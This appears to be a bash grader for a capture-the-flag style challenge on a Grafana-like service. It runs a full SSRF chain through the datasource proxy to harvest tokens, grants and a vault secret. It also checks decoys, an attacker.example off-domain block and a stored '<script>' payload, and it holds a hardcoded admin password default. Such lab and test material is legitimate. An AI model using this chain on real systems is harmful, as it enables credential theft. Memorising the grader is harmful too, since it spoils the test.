#!/bin/bash
BASE="${TARGET:-}"
if [ -z "$BASE" ] && [ -s /vchan/web_ip ]; then
    while IFS= read -r _c; do
      [ -z "$_c" ] && continue
      if curl -s -o /dev/null --max-time 3 "http://${_c}:8080/health"; then BASE="http://${_c}:8080"; break; fi
    done < /vchan/web_ip
fi
[ -z "$BASE" ] && BASE="http://web:8080"
fails=0
note(){ echo "$1"; }

PADMIN_USER="platform-admin"
PADMIN_PASS="${PLATFORM_ADMIN_PASS:-PlatEng-OnCall-7731}"
A(){ curl -s --max-time 25 -u "${PADMIN_USER}:${PADMIN_PASS}" "$@"; }
mkds(){
  A -H 'Content-Type: application/json' -X POST \
    -d "{\"name\":\"$2\",\"type\":\"graphite\",\"access\":\"proxy\",\"url\":\"$1\"}" \
    "$BASE/api/datasources" | python3 -I -c 'import sys,json
try:
    d=json.load(sys.stdin); print((d.get("datasource") or {}).get("uid") or d.get("uid") or "")
except Exception: print("")'; }
jget(){ python3 -I -c 'import sys,json
try: print(json.load(sys.stdin).get(sys.argv[1],""))
except Exception: print("")' "$1"; }

PROM_UID="$(A "$BASE/api/datasources" | python3 -I -c 'import sys,json
try:
    d=json.load(sys.stdin)
    for x in d:
        if "metrics.obs.internal" in (x.get("url") or ""): print(x["uid"]); break
except Exception: pass')"
CFG_UID="$(mkds "http://svc-c2.obs.internal" "maze-config-$$")"
TOK_JSON="$(A "$BASE/api/datasources/proxy/uid/${CFG_UID}/v1/tokens")"
REG_URL="$(printf '%s' "$TOK_JSON" | jget registry_url)"
ALL_TOKENS="$(printf '%s' "$TOK_JSON" | python3 -I -c 'import sys,json
try:
    d=json.load(sys.stdin); print("\n".join(t["token"] for t in d["tokens"]))
except Exception: pass')"
REG_UID="$(mkds "${REG_URL:-http://svc-a3.obs.internal}" "maze-registry-$$")"
VALID_TOKEN=""; REC=""
_oldifs=$IFS; IFS='
'; set -f
for t in $ALL_TOKENS; do
  [ -z "$t" ] && continue
  rc="$(A -o /dev/null -w '%{http_code}' "$BASE/api/datasources/proxy/uid/${REG_UID}/v1/records/payments-api?token=${t}")"
  if [ "$rc" = "200" ]; then
    VALID_TOKEN="$t"
    REC="$(A "$BASE/api/datasources/proxy/uid/${REG_UID}/v1/records/payments-api?token=${t}")"
    break
  fi
done
set +f; IFS=$_oldifs
VAULT_URL="$(printf '%s' "$REC" | jget vault_url)"
CRED_REF="$(printf '%s' "$REC" | jget credential_ref)"
GRANT_JSON="$(A "$BASE/api/datasources/proxy/uid/${CFG_UID}/v1/grant?ref=${CRED_REF}&token=${VALID_TOKEN}")"
VGRANT="$(printf '%s' "$GRANT_JSON" | jget grant)"
VLT_UID="$(mkds "${VAULT_URL:-http://svc-e4.obs.internal}" "maze-vault-$$")"
GT="$(A "$BASE/api/datasources/proxy/uid/${VLT_UID}/v1/secret?ref=${CRED_REF}&grant=${VGRANT}" | jget secret)"
if [ -z "$GT" ]; then
  note "FAIL: could not establish ground truth via the intended chain (GT=) — not reading off disk"
  fails=$((fails+1))
fi

EVIL_UID="$(mkds "http://attacker.example" "maze-offdomain-$$")"
evil="$(A "$BASE/api/datasources/proxy/uid/${EVIL_UID}/v1/tokens")"
if printf '%s' "$evil" | grep -q "not included in whitelist"; then note "ok: off-domain host blocked by whitelist (bug bounded to *.obs.internal)"; else note "FAIL: off-domain host was NOT whitelist-blocked"; fails=$((fails+1)); fi
if [ -n "$GT" ] && printf '%s' "$evil" | grep -qF "$GT"; then note "FAIL: off-domain branch leaked the scored secret"; fails=$((fails+1)); fi

if [ -n "$GT" ] && printf '%s' "$REC" | grep -qF "$GT"; then note "FAIL: the registry record leaked the scored secret directly"; fails=$((fails+1)); else note "ok: registry record carries ref+grant_broker pointer, not the password"; fi
printf '%s' "$REC" | grep -q "db_password" && { note "FAIL: registry record still exposes a db_password field"; fails=$((fails+1)); } || note "ok: no db_password field in the registry record"
if [ -n "$VGRANT" ] && printf '%s' "$REC" | grep -qF "$VGRANT"; then note "FAIL: the registry record HANDED over the vault grant (second-order loop-back defeated)"; fails=$((fails+1)); else note "ok: registry record does not contain the grant (minted at the config broker)"; fi
printf '%s' "$REC" | grep -q "grant_broker" || { note "FAIL: registry record missing the grant_broker pointer"; fails=$((fails+1)); }

nogr="$(A "$BASE/api/datasources/proxy/uid/${CFG_UID}/v1/grant?ref=${CRED_REF}")"
if printf '%s' "$nogr" | grep -q "\"grant\""; then note "FAIL: config broker minted a grant with no registry token"; fails=$((fails+1)); else note "ok: config grant broker rejects a grant request with no token"; fi
_oldifs=$IFS; IFS='
'; set -f
for t in $ALL_TOKENS; do
  [ -z "$t" ] && continue
  [ "$t" = "$VALID_TOKEN" ] && continue
  dg="$(A "$BASE/api/datasources/proxy/uid/${CFG_UID}/v1/grant?ref=${CRED_REF}&token=${t}")"
  if printf '%s' "$dg" | grep -q "\"grant\""; then note "FAIL: a decoy token minted a grant at the config broker (token=$(printf '%.12s' "$t")…)"; fails=$((fails+1)); fi
done
set +f; IFS=$_oldifs
note "ok: config grant broker rejects decoy tokens (only the scoped registry token mints a grant)"

_oldifs=$IFS; IFS='
'; set -f
for t in $ALL_TOKENS; do
  [ -z "$t" ] && continue
  [ "$t" = "$VALID_TOKEN" ] && continue
  rc="$(A -o /dev/null -w '%{http_code}' "$BASE/api/datasources/proxy/uid/${REG_UID}/v1/records/payments-api?token=${t}")"
  if [ "$rc" = "200" ]; then note "FAIL: a decoy token opened payments-api (token=$(printf '%.12s' "$t")…, rc=$rc)"; fails=$((fails+1)); fi
done
set +f; IFS=$_oldifs
note "ok: decoy registry tokens rejected by the registry"

MET_UID="$(mkds "http://metrics.obs.internal:9090" "maze-metrics-$$")"
MET_DECOYS="$(A "$BASE/api/datasources/proxy/uid/${MET_UID}/metrics" | grep -oE 'plat_[0-9a-f]{40}' | sort -u)"
_oldifs=$IFS; IFS='
'; set -f
for t in $MET_DECOYS; do
  [ -z "$t" ] && continue
  rc="$(A -o /dev/null -w '%{http_code}' "$BASE/api/datasources/proxy/uid/${REG_UID}/v1/records/payments-api?token=${t}")"
  if [ "$rc" = "200" ]; then note "FAIL: a /metrics decoy token opened payments-api (rc=$rc)"; fails=$((fails+1)); fi
done
set +f; IFS=$_oldifs
note "ok: /metrics decoy tokens do not open the registry"

badgrant="$(A "$BASE/api/datasources/proxy/uid/${VLT_UID}/v1/secret?ref=${CRED_REF}&grant=vg_0000000000000000000000000000000000000000")"
if printf '%s' "$badgrant" | grep -q "\"secret\""; then note "FAIL: vault released a secret for a wrong grant"; fails=$((fails+1)); else note "ok: vault rejects a wrong grant for the ref"; fi
nogrant="$(A "$BASE/api/datasources/proxy/uid/${VLT_UID}/v1/secret?ref=${CRED_REF}")"
if printf '%s' "$nogrant" | grep -q "\"secret\""; then note "FAIL: vault released a secret with no grant"; fails=$((fails+1)); else note "ok: vault rejects a missing grant"; fi

for svc in auth-service billing-api ledger-reconciler; do
  srec="$(A "$BASE/api/datasources/proxy/uid/${REG_UID}/v1/records/${svc}?token=${VALID_TOKEN}")"
  sref="$(printf '%s' "$srec" | jget credential_ref)"
  sgrant="$(A "$BASE/api/datasources/proxy/uid/${CFG_UID}/v1/grant?ref=${sref}&token=${VALID_TOKEN}" | jget grant)"
  x="$(A "$BASE/api/datasources/proxy/uid/${VLT_UID}/v1/secret?ref=${CRED_REF}&grant=${sgrant}")"
  if printf '%s' "$x" | grep -q "\"secret\""; then note "FAIL: sibling $svc grant opened the payments-api ref"; fails=$((fails+1)); fi
  y="$(A "$BASE/api/datasources/proxy/uid/${VLT_UID}/v1/secret?ref=${sref}&grant=${sgrant}" | jget secret)"
  if [ -n "$GT" ] && [ -n "$y" ] && [ "$y" = "$GT" ]; then note "FAIL: sibling $svc secret equals the scored secret"; fails=$((fails+1)); fi
done
note "ok: sibling grants are bound to their own refs; sibling secrets are distinct"

if [ -n "$GT" ] && printf '%s' "$TOK_JSON" | grep -qF "$GT"; then note "FAIL: config token catalog leaked the scored secret"; fails=$((fails+1)); else note "ok: config token catalog carries no db_password"; fi

LOG_UID="$(mkds "http://logs.obs.internal:3100" "maze-logs-$$")"
logb="$(A "$BASE/api/datasources/proxy/uid/${LOG_UID}/loki/api/v1/labels")"
if [ -n "$GT" ] && printf '%s' "$logb" | grep -qF "$GT"; then note "FAIL: logs host leaked the scored secret"; fails=$((fails+1)); else note "ok: logs host inert"; fi

for de in "svc-b7.obs.internal /api/search trace-store" "svc-d9.obs.internal /api/v2/alerts alert-store"; do
  set -- $de; dh="$1"; dp="$2"; dn="$3"
  DUID="$(mkds "http://${dh}" "maze-deadend-$(printf '%s' "$dh" | tr -cd 'a-z0-9')-$$")"
  didx="$(A "$BASE/api/datasources/proxy/uid/${DUID}/")"
  dbody="$(A "$BASE/api/datasources/proxy/uid/${DUID}${dp}")"
  printf '%s' "$didx" | grep -q "$dn" || { note "FAIL: dead-end $dh did not respond live as $dn"; fails=$((fails+1)); }
  if [ -n "$GT" ] && { printf '%s' "$didx" | grep -qF "$GT" || printf '%s' "$dbody" | grep -qF "$GT"; }; then note "FAIL: dead-end $dh leaked the scored secret"; fails=$((fails+1)); fi
done
note "ok: opaque dead-end services (trace-store, alert-store) are live and hold no path to the secret"

PROM2="$(mkds "http://metrics.obs.internal:9090" "maze-prom-$$")"
mtgts="$(A "$BASE/api/datasources/proxy/uid/${PROM2}/api/v1/targets")"
for chain in svc-c2.obs.internal svc-a3.obs.internal svc-e4.obs.internal; do
  if printf '%s' "$mtgts" | grep -q "$chain"; then note "FAIL: scrape targets advertise chain host $chain (should be pointer-only)"; fails=$((fails+1)); fi
done
mexp="$(A "$BASE/api/datasources/proxy/uid/${PROM2}/metrics")"
printf '%s' "$mexp" | grep -q 'platform_config_source{endpoint="http://svc-c2.obs.internal"}' || { note "FAIL: metrics exposition missing the single config-source pointer"; fails=$((fails+1)); }
if [ -n "$GT" ] && printf '%s' "$mexp" | grep -qF "$GT"; then note "FAIL: metrics exposition leaked the scored secret"; fails=$((fails+1)); fi
note "ok: discovery is pointer-following (scrape list has no chain hosts; broker named once via platform_config_source)"

live(){
  if [ "$2" = "000" ] || [ -z "$2" ]; then note "FAIL: surface '$1' did not respond live (rc=$2) — stubbed/absent"; fails=$((fails+1)); else note "ok(live): surface '$1' responds (rc=$2)"; fi
}
rc_admin="$(A -o /dev/null -w '%{http_code}' "$BASE/api/admin/users")"; live "BAC /api/admin/users (server-admin gated)" "$rc_admin"
case "$rc_admin" in 401|403|404) : ;; *) note "WARN: /api/admin/users returned $rc_admin (expected 401/403/404 for a non-server-admin)";; esac
rc_org="$(A -o /dev/null -w '%{http_code}' "$BASE/api/org/users")"; live "BAC /api/org/users (org-scoped read)" "$rc_org"
for ep in "/api/datasources" "/api/admin/settings" "/api/org/users" "/api/orgs" "/api/users" "/api/dashboards/home" "/api/annotations"; do
  b="$(A "$BASE$ep")"
  if [ -n "$GT" ] && printf '%s' "$b" | grep -qF "$GT"; then note "FAIL: grafana surface $ep leaked the scored secret"; fails=$((fails+1)); fi
done
SA="$(A -w '\n%{http_code}' -H 'Content-Type: application/json' -X POST -d "{\"name\":\"maze-sa-$$\",\"role\":\"Viewer\"}" "$BASE/api/serviceaccounts")"
rc_sa="$(printf '%s' "$SA" | tail -n1)"; live "authn /api/serviceaccounts (mint Viewer SA)" "$rc_sa"
DB="$(A -w '\n%{http_code}' -H 'Content-Type: application/json' -X POST -d "{\"dashboard\":{\"title\":\"maze-$$ <script>x</script>\",\"panels\":[]},\"overwrite\":true}" "$BASE/api/dashboards/db")"
rc_db="$(printf '%s' "$DB" | tail -n1)"; live "stored-content /api/dashboards/db (store payload)" "$rc_db"
rc_cp="$(A -o /dev/null -w '%{http_code}' "$BASE/api/v1/provisioning/contact-points")"; live "webhook /api/v1/provisioning/contact-points" "$rc_cp"
CP="$(A "$BASE/api/v1/provisioning/contact-points")"
if [ -n "$GT" ] && { printf '%s' "$SA" | grep -qF "$GT" || printf '%s' "$DB" | grep -qF "$GT" || printf '%s' "$CP" | grep -qF "$GT"; }; then note "FAIL: an auth/content/webhook surface leaked the scored secret"; fails=$((fails+1)); fi
note "ok: five distinct-category surfaces (datasource-proxy SSRF [scored], access-control, authn/service-accounts, stored-content, outbound-webhook) probed LIVE; exactly one (SSRF) reaches the secret"

res="$(A "$BASE/api/datasources/uid/${REG_UID}/resources/v1/records/payments-api?token=${VALID_TOKEN}")"
if [ -n "$GT" ] && printf '%s' "$res" | grep -qF "$GT"; then note "FAIL: resource API (/resources) reached the registry and leaked the scored secret"; fails=$((fails+1)); else note "ok: resource API does not reach the internal /v1 registry paths"; fi

code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$BASE/internal/diag/audit")"
if [ "$code" != "404" ]; then note "FAIL: diag/audit returned $code without the verifier token (negative anti-cheat)"; fails=$((fails+1)); else note "ok: diag/audit hidden without token"; fi

note "maze failures: $fails"
exit $fails
